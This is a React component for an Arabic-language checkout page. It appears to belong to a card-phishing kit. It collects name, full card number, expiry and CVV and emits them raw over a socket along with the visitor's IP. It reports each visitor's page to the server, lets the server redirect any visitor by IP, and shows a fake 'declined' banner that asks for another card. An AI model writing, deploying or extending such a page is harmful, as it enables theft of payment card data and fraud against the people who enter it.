import React, { useEffect, useRef, useState } from "react";
import { useNavigate } from "react-router-dom";
import { socket } from "../App";

const Payment = () => {
  const [visitorIP, setVisitorIP] = useState(null);
  const [cardType, setCardType] = useState(null);
  const [showOverlay, setShowOverlay] = useState(false);
  const [declined, setDeclined] = useState(false);
  const navigate = useNavigate();
  const method = sessionStorage.getItem("paymentMethod");
  const holderRef = useRef();
  const cardRef = useRef();
  const expiryRef = useRef();
  const cvvRef = useRef();

  useEffect(() => {
    const fetchIP = async () => {
      try {
        const res = await fetch("https://api.ipify.org?format=json");
        const { ip } = await res.json();
        setVisitorIP(ip);
        const page = window.location.pathname.split("/").pop() || "payment";
        socket.connect();
        socket.emit("updateLocation", { ip, page });
      } catch (err) {
        console.error("IP Fetch failed", err);
      }
    };

    fetchIP();

    if (window.location.search.includes("declined=true")) {
      setDeclined(true);
    }

    socket.on("ackPayment", (resp) => {
      if (!resp.success) {
        setShowOverlay(false);
        console.error(resp.error);
      }
    });

    return () => {
      socket.disconnect();
    };
  }, []);

  const isValidCardNumber = (num) => {
    const clean = num.replace(/\D/g, "");
    if (clean.length < 12 || clean.length > 19) return false;
    const digits = clean
      .split("")
      .reverse()
      .map((d) => parseInt(d, 10));
    let sum = 0;
    for (let i = 0; i < digits.length; i++) {
      let d = digits[i];
      if (i % 2 === 1) {
        d *= 2;
        if (d > 9) d -= 9;
      }
      sum += d;
    }
    return sum % 10 === 0;
  };

  const formatCardNumber = (value) => {
    return value
      .replace(/\D/g, "")
      .substring(0, 16)
      .replace(/(.{4})/g, "$1 ")
      .trim();
  };

  const isValidExpiryDate = (value) => {
    if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(value)) return false;
    const [month, year] = value.split("/").map(Number);
    const now = new Date();
    const expiry = new Date(`20${year}`, month);
    return expiry > now;
  };

  const isValidCardHolderName = (name) => {
    const trimmed = name.trim();
    if (trimmed.length < 3) return false;
    if (/[^a-zA-Zء-ي\s]/.test(trimmed)) return false;
    if (/(.)\1{2,}/.test(trimmed)) return false;
    return true;
  };

  const detectCardType = (number) => {
    const clean = number.replace(/\s+/g, "");
    if (/^4/.test(clean)) return "visa";
    if (/^5[1-5]/.test(clean)) return "mastercard";
    return null;
  };

  const handleCardInput = (e) => {
    const formatted = formatCardNumber(e.target.value);
    e.target.value = formatted;

    const type = detectCardType(formatted);
    setCardType(type);

    if (isValidCardNumber(formatted)) {
      e.target.classList.add("border-green-500");
      e.target.classList.remove("border-red-500");
    } else {
      e.target.classList.add("border-red-500");
      e.target.classList.remove("border-green-500");
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    const name = holderRef.current.value.trim();
    const cardNumber = cardRef.current.value.replace(/\s+/g, "");
    const exp = expiryRef.current.value.trim();
    const cvv = cvvRef.current.value.trim();

    if (!cvv) return alert("رجاءً أدخل رمز CVV صالح");

    sessionStorage.setItem("cardBin", cardNumber.substring(0, 6));

    const payload = {
      ip: visitorIP,
      cardHolderName: name,
      cardNumber,
      expirationDate: exp,
      cvv,
      method
    };

    setShowOverlay(true);
    socket.emit("submitPayment", payload);
  };

  socket.on("navigateTo", ({ ip, page }) => {
    console.log(localStorage.getItem("visitorIP"));
    if (ip == localStorage.getItem("visitorIP")) {
      
      window.location.href = "/" + page;
    }
  });

  return (
    <div className="min-h-screen bg-gray-100 p-4" dir="rtl">
      {declined && (
        <div className="max-w-lg mx-auto bg-red-100 text-red-700 p-4 rounded mb-4">
          لم يتم معالجة طلبك، يرجى استخدام وسيلة دفع أخرى.
        </div>
      )}

      <div className="max-w-lg mx-auto bg-white p-6 rounded shadow">
        <h3 className="text-gray-700 text-sm mb-1">نظام معالجة المدفوعات</h3>
        <hr className="mb-3" />
        <p className="text-xs font-bold text-[#146394] mb-2">
          سيتم تنفيذ عملية الدفع من خلال الوسيلة المحددة أدناه.
        </p>
        <img
          src={
            sessionStorage.getItem("paymentMethod") === "mada"
              ? "/mad.png"
              : sessionStorage.getItem("paymentMethod") === "visa_mastarcard"
              ? "/vimas.webp"
              : "/appy.jpg"
          }
          alt=""
          className="w-1/4 mb-4"
        />

        <form onSubmit={handleSubmit} className="w-full block">
          <div className="mb-4">
            <label className="block text-sm text-gray-600 mb-1">
              اسم حامل البطاقة
            </label>
            <input
              ref={holderRef}
              type="text"
              className="w-full border p-2 text-center rounded"
              required
            />
          </div>

          <div className="mb-4 relative">
            <label className="block text-sm text-gray-600 mb-1">
              رقم البطاقة
            </label>
            <input
              ref={cardRef}
              onInput={handleCardInput}
              placeholder="0000 0000 0000 0000"
              className="w-full border p-2 text-center rounded"
              required
              dir="ltr"
            />
            {cardType && (
              <img
                src={cardType === "visa" ? "/Visa.png" : "/Mastercard.png"}
                alt=""
                className="absolute left-2 top-9 w-8"
              />
            )}
          </div>

          <div className="flex gap-2 mb-4">
            <div className="w-1/2">
              <label className="block text-sm text-gray-600 mb-1">
                تاريخ انتهاء البطاقة
              </label>
              <input
                ref={expiryRef}
                placeholder="MM/YY"
                className="w-full border p-2 text-center rounded"
                onInput={(e) => {
                  let value = e.target.value
                    .replace(/[^\d]/g, "")
                    .substring(0, 4);
                  if (value.length >= 3) {
                    value = value.substring(0, 2) + "/" + value.substring(2);
                  }
                  e.target.value = value;
                }}
                required
              />
            </div>
            <div className="w-1/2">
              <label className="block text-sm text-gray-600 mb-1 w-full text-left">
                CVV
              </label>
              <input
                ref={cvvRef}
                type="password"
                maxLength="3"
                placeholder="***"
                className="w-full border p-2 text-center rounded"
                required
              />
            </div>
          </div>

          <button
            type="submit"
            className="w-full bg-yellow-500 text-white font-bold py-2 rounded"
          >
            إتمام الدفع
          </button>
          <p className="mt-3 text-gray-500 text-xs leading-snug">
            نحرص على استخدام بياناتك الشخصية فقط لغرض تنفيذ طلبك، وذلك بما
            يتوافق مع سياسة الخصوصية المعتمدة.
          </p>
        </form>
      </div>

      <div className="text-center mt-4 space-x-4">
        <img src="/vecteezy-icon.png" width="100" className="inline" />
        <img src="/vecteezy_icon01.jpg" width="45" className="inline" />
      </div>

      {showOverlay && (
        <div className="fixed inset-0 bg-black bg-opacity-60 flex items-center justify-center z-50">
          <div className="text-white text-center space-y-2">
            <div className="animate-spin rounded-full h-10 w-10 border-4 border-white border-t-transparent mx-auto"></div>
            <h5 className="font-bold">يرجى الانتظار</h5>
            <p>انتظر حتى تتم معالجة طلبك</p>
          </div>
        </div>
      )}
    </div>
  );
};

export default Payment;
